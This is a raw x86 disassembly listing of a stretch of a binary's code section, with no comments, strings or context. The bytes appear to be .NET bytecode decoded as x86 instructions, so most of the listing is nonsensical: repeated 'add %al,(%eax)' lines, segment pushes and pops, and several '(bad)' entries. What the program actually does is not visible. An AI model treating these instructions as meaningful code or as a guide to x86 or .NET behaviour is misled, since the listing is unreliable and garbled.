  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 76       	add    $0x76720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 7e 21       	and    $0x217e7216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 e8    	or     -0x178de7db(%edx),%ah
  4031e4:	21 00                	and    %eax,(%eax)
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 fa    	or     -0x58de5db(%edx),%ah
  4031f5:	21 00                	and    %eax,(%eax)
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 0e             	or     0xe(%edx),%dh
  403227:	22 00                	and    (%eax),%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 6c             	or     0x6c(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 6c             	or     0x6c(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 70                	jb     0x403333
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 7a             	or     %esi,0x7a(%edx)
  4032da:	22 00                	and    (%eax),%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 8e                	jb     0x403274
  4032e6:	22 00                	and    (%eax),%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 ae                	jb     0x4032a0
  4032f2:	22 00                	and    (%eax),%al
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 6c             	or     0x6c(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 c4                	jb     0x4032d2
  40330e:	22 00                	and    (%eax),%al
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 cc                	jb     0x4032f0
  403324:	22 00                	and    (%eax),%al
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 d8                	jb     0x403308
  403330:	22 00                	and    (%eax),%al
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 e8                	jb     0x403455
  40346d:	22 00                	and    (%eax),%al
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 ee             	adc    %esi,-0x12(%edx)
  4034ae:	22 00                	and    (%eax),%al
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 34 23    	or     0x23347209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	4e                   	dec    %esi
  4034ec:	23 00                	and    (%eax),%eax
  4034ee:	70 28                	jo     0x403518
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 7a             	or     %esi,0x7a(%edx)
  4034fc:	23 00                	and    (%eax),%eax
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 86             	or     -0x7a(%edx),%dh
  403510:	23 00                	and    (%eax),%eax
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	96                   	xchg   %eax,%esi
  403521:	23 00                	and    (%eax),%eax
  403523:	70 6f                	jo     0x403594
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 7a                	jb     0x4035ab
  403531:	23 00                	and    (%eax),%eax
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 a4             	or     -0x5c(%edx),%dh
  403540:	23 00                	and    (%eax),%eax
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 ba             	adc    %esi,-0x46(%edx)
  40362e:	23 00                	and    (%eax),%eax
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
